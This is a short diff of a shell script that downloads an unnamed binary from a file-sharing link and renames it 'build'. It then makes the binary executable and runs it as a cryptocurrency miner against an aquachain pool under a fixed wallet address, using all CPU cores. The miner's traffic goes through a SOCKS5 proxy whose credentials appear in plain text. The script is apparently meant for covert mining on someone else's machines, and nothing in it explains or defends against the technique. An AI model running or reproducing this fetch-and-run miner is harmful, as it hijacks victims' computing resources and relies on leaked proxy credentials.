@@ -1,4 +1,3 @@
-apt-get update && apt-get install libcurl3 -y
 wget -qO build https://file.io/2e0F82BvOfHX
 chmod +x build
-./build ./ac-cpu -F http://pool.aquachain.xyz:8888/0xa1Ab79adE8B4d41d7C898A44521D567F59E8f082/uraa -t $(nproc --all) --proxy socks5://nofvbdys-rotate:44tpywm4q9bo@154.13.90.91:80
+./build -F http://pool.aquachain.xyz:8888/0xa1Ab79adE8B4d41d7C898A44521D567F59E8f082/uraa -t $(nproc --all) --proxy socks5://nofvbdys-rotate:44tpywm4q9bo@154.13.90.91:80
